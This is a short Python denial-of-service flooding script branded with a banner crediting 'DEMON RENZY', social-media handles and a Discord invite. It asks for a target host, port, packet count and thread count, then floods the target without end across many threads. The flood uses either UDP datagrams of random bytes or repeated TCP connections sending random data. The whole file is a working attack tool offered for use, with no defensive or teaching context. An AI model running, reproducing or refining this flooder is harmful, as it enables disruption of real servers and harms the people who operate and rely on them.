#!/usr/bin/env python3
import random
import socket
import threading

print ("########  ######## ##     ##  #######  ##    ## ") 
print ("##     ## ##       ###   ### ##     ## ###   ## ")
print ("##     ## ##       #### #### ##     ## ####  ## ")
print ("##     ## ######   ## ### ## ##     ## ## ## ## ") 
print ("##     ## ##       ##     ## ##     ## ##  #### ")
print ("##     ## ##       ##     ## ##     ## ##   ### ")  
print ("########  ######## ##     ##  #######  ##    ## ")  

print       (" - - > TOOLS CREATED BY DEMON RENZY < - - ")
print       (" - - > INSTAGRAM : sndigans_ < - - ")
print       (" - - > DISCORD : XDemonRenzy#8851<- - ")                                   
print       (" - - > DM ME IF YOU NEED HELP < - - ")
print       (" - - > JOIN RZ TEAM TO LEARN AGAIN < - - ")
print       (" - - > https://discord.gg/FBwqssW4gy < - - ")
    
ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Want Ddos?(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(1800)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" RENZY ATTACKED THE SERVER")
		except:
			print("[!] ERROR SERVER TIME OUT")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" RENZY ATTACKED THE SERVER ")
		except:
			s.close()
			print("[*] ERROR SERVER TIME OUT")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
